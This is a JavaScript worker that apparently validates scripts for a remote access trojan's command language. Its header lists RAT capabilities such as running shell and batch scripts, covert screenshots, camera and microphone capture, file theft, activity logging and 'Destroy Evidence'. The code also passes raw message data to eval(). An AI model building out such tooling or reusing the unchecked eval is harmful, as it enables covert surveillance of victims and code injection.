/*
List of Built-in PC functions

Eg: PC.Lock("A01");

------------------------------------------------
Command         Ack     Description
------------------------------------------------
Excape(x)        Y      Execute Batch script and Escape()
Escape()         Y      Destroy Evidence and Escape
Marco()          Y      Returns Polo if Online
Close()          Y      End Execution
Update(x)        Y      Updates self
Hibernate(x)     Y      Hibernate till date
Revive()         Y      End Hibernation  
Notify()         Y      Notifies power schedule
Rename(x)        Y      Renames RAT
Flash()          N      Flashes Screen, Visual Indication
Vbs(x)           Y      Runs .VBS Script
Bat(x)           Y      Runs .Bat Script
Shell(x)         Y      Runs Shell Commands
Speak(x)         Y      Text to Speech
Play(x)          Y      Play a Remote (mp3) Audio File (URL)
Mic(x)           N      Records audio for 'x' ms
Lock(x)          N      Select Target
Info(x)          Y      Shows Info box
Warn(x)          Y      Shows Warning Box
Error(x)         Y      Shows Error box
Msgbox(x,y)      Y      Shows Msg Box fo 'y' ms
Google(x)        Y      Googles selected Text
Web(x)           Y      Navigates to 'x' url
Type(x)          Y      Types custom text
Screenshot(x)    Y      Takes a Screenshot
Camera(x)        Y      Captures a Photo
Disk(x)          Y      Retrieves Disk Info
Tree(x)          Y      Retrieves Disk Info
Send(x)          Y      Sends a File
Zip(x)           Y      Zip a folder
Unzip(x)         Y      Unzips file
Health(x)        Y      Reports back working conditions
Log(x)           Y      Logs every Activity
Delay(x)         N      Pause Execution temporarily for 'x' ms
Clone()          Y      Initiate Clone Operations
Noclone()        Y      Stops Cloning op

And more...

*/
onmessage = function (event) {
 var txt = "Code Summary:"; //List of Commands
 var arr = [false, "txt", "html", "target", false]; //Err checking, Err Description & Target

 var PC = {
  Lock: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Target Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Lock(<grn>target_name</grn>)<br><br>Compiler failed with exit code 1F53";
    } else {
     arr[3] = x;
     arr[4] = true;
    }
   }
  },
  Cmd: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Command Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Cmd(<grn>command</grn>)<br><br>Compiler failed with exit code 1F66";
    } else {
     txt += "<br>- Runs Win32 Terminal Commands";
    }
   }
  },
  Delay: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Delay Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Delay(<grn>milliseconds</grn>)<br><br>Compiler failed with exit code 1F84";
    } else {
     txt += "<br>- Adds temporarily delay";
    }
   }
  },
  Google: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Query Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Google(<grn>query</grn>)<br><br>Compiler failed with exit code 1F69";
    } else {
     txt += "<br>- Googles the selected Query";
    }
   }
  },
  Play: (x) => {
   if (!arr[0]) {
    if (x == undefined) {
     arr[0] = true;
     arr[1] = "Audio ref Cannot be Empty";
     arr[2] = "<red>Program Error</red><br><br>Expecting an Argument, PC.Play(<grn>*.mp3</grn>)<br><br>Compiler failed with exit code 1F96";
    } else {
     txt += "<br>- Plays a Remote Audio file on host PC";
    }
   }
  },
 };

 try {
  eval(event.data);
 } catch (e) {
  arr[0] = true;
  arr[1] = e;
  arr[2] = "<red>Program Error</red><br><br>Compiler failed with exit code 1F206";
 }

 if (!arr[0] && !arr[4]) {
  arr = [true, "Target Not specified", "<red>Program Error</red><br><br>Syntax: PC.Lock(<grn>target_name</grn>)<br><br>Compiler failed with exit code 1F43", "target", false];
 }
 arr[0] ? postMessage(arr) : txt == "Code Summary:" ? postMessage([false, "Ready to Run on: '" + arr[3] + "'", "<grn>Program Compiled succesfully..</grn><br><br>- No Actions to perform.", arr[3]]) : postMessage([false, "Ready to Run on: '" + arr[3] + "'", "<grn>Program Compiled succesfully..</grn><br><br>" + txt, arr[3]]);
};
